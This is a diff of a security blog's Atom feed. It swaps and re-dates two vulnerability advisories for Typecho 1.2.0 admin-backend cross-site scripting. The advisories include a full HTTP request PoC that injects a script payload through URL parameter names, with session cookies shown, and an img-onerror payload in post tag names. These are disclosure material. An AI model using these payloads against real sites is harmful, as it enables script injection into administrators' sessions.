@@ -6,7 +6,7 @@
   <link href="https://srpopty.github.io/atom.xml" rel="self"/>
   
   <link href="https://srpopty.github.io/"/>
-  <updated>2023-02-21T11:48:55.000Z</updated>
+  <updated>2023-02-21T12:12:27.000Z</updated>
   <id>https://srpopty.github.io/</id>
   
   <author>
@@ -17,16 +17,16 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Vulnerability - Typecho V1.2.0 Backend DOM-Based XSS (CVE-2023-xxxx)</title>
-    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/"/>
-    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/</id>
-    <published>2023-02-21T11:48:55.000Z</published>
-    <updated>2023-02-21T11:48:55.000Z</updated>
+    <title>Vulnerability - Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)</title>
+    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/"/>
+    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/</id>
+    <published>2023-02-21T12:12:27.000Z</published>
+    <updated>2023-02-21T12:12:27.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx"><a href="#Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx" class="headerlink" title="Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)"></a>Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)</h1><hr><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Typecho admin backend post editor with DOM-based XSS when adding a new post tag.</p><ol><li>Login to admin backend management system.</li><li>Create a new or edit an existed post, in <code>admin/write-post.php</code> add a new tag.</li><li>If the new tag name contains the XSS payload, e.g. <code>&lt;li&gt;&lt;p&gt;aaa&lt;a&gt;test&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;</code>, it will be injected into a <code>&lt;li&gt;</code> html tag.</li></ol><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/1.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;p&gt;aaa&lt;img src=x onerror=alert(1)&gt;aaa&lt;/p&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/2.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/3.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/typecho/typecho/issues/1536">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
+    <content type="html"><![CDATA[<h1 id="Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx"><a href="#Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx" class="headerlink" title="Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)"></a>Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)</h1><hr><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Typecho admin backend management system with reflected-XSS in the name of an arbitrarily supplied URL parameter.</p><ol><li>Login to typecho admin backend management system, in <code>/admin/index.php</code>, <code>admin/themes.php</code> or <code>/admin/backup.php</code>.</li><li>In the name of an arbitrarily supplied URL parameter, no matter key or value, will be injected to a html href attribute of <code>&lt;a&gt;</code> tag.</li></ol><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/1.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /typecho/admin/?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--bbb=1 HTTP/1.1</span><br><span class="line">Host: 192.168.0.10</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.0.10/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Ftypecho%2Fadmin%2Findex.php%3Fr7ptu%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253Eat2f7%3D1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: e4dff44224c23efabc177d44e50b1de4__typecho_uid=1; e4dff44224c23efabc177d44e50b1de4__typecho_authCode=%24T%248O0qulQf98a49e06253d4ae8c93f478424457be4b; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in <code>/admin/index.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/2.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/3.png"></p><p>in <code>/admin/theme.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/5.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/6.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/4.png"></p><p>in <code>/admin/backup.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/8.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/9.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/7.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/typecho/typecho/issues/1535">Github Issue</a></li><li><a href="https://github.com/typecho/typecho/commit/f9ede542c9052ba22a6096d8412e2f02d9de872b">Github Commit</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
     
     
-    <summary type="html">Typecho-V1.2.0 with Backend DOM-Based Cross-Site Scripting in post editor.</summary>
+    <summary type="html">Typecho-V1.2.0 with Backend Reflected Cross-Site Scripting in admin backend management system.</summary>
     
     
     
@@ -42,16 +42,16 @@
   </entry>
   
   <entry>
-    <title>Vulnerability - Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)</title>
-    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/"/>
-    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/</id>
+    <title>Vulnerability - Typecho V1.2.0 Backend DOM-Based XSS (CVE-2023-xxxx)</title>
+    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/"/>
+    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/</id>
     <published>2023-02-21T11:48:55.000Z</published>
     <updated>2023-02-21T11:48:55.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx"><a href="#Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx" class="headerlink" title="Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)"></a>Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)</h1><hr><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Typecho admin backend management system with reflected-XSS in the name of an arbitrarily supplied URL parameter.</p><ol><li>Login to typecho admin backend management system, in <code>/admin/index.php</code>, <code>admin/themes.php</code> or <code>/admin/backup.php</code>.</li><li>In the name of an arbitrarily supplied URL parameter, no matter key or value, will be injected to a html href attribute of <code>&lt;a&gt;</code> tag.</li></ol><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/1.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /typecho/admin/?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--bbb=1 HTTP/1.1</span><br><span class="line">Host: 192.168.0.10</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.0.10/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Ftypecho%2Fadmin%2Findex.php%3Fr7ptu%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253Eat2f7%3D1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: e4dff44224c23efabc177d44e50b1de4__typecho_uid=1; e4dff44224c23efabc177d44e50b1de4__typecho_authCode=%24T%248O0qulQf98a49e06253d4ae8c93f478424457be4b; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in <code>/admin/index.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/2.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/3.png"></p><p>in <code>/admin/theme.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/5.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/6.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/4.png"></p><p>in <code>/admin/backup.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/8.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/9.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/7.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/typecho/typecho/issues/1535">Github Issue</a></li><li><a href="https://github.com/typecho/typecho/commit/f9ede542c9052ba22a6096d8412e2f02d9de872b">Github Commit</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
+    <content type="html"><![CDATA[<h1 id="Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx"><a href="#Typecho-V1-2-0-Backend-Reflected-XSS-CVE-2023-xxxx" class="headerlink" title="Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)"></a>Typecho V1.2.0 Backend Reflected XSS (CVE-2023-xxxx)</h1><hr><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Typecho admin backend post editor with DOM-based XSS when adding a new post tag.</p><ol><li>Login to admin backend management system.</li><li>Create a new or edit an existed post, in <code>admin/write-post.php</code> add a new tag.</li><li>If the new tag name contains the XSS payload, e.g. <code>&lt;li&gt;&lt;p&gt;aaa&lt;a&gt;test&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;</code>, it will be injected into a <code>&lt;li&gt;</code> html tag.</li></ol><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/1.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;p&gt;aaa&lt;img src=x onerror=alert(1)&gt;aaa&lt;/p&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/2.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/3.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/typecho/typecho/issues/1536">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
     
     
-    <summary type="html">Typecho-V1.2.0 with Backend Reflected Cross-Site Scripting in admin backend management system.</summary>
+    <summary type="html">Typecho-V1.2.0 with Backend DOM-Based Cross-Site Scripting in post editor.</summary>
     
     
     
@@ -258,9 +258,9 @@
     <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
     
     
-    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
-    
     <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
+    
+    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
     
   </entry>
   
@@ -281,9 +281,9 @@
     <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
     
     
-    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
-    
     <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
+    
+    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
     
   </entry>
   
@@ -304,9 +304,9 @@
     <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
     
     
-    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
-    
     <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
+    
+    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
     
   </entry>
   
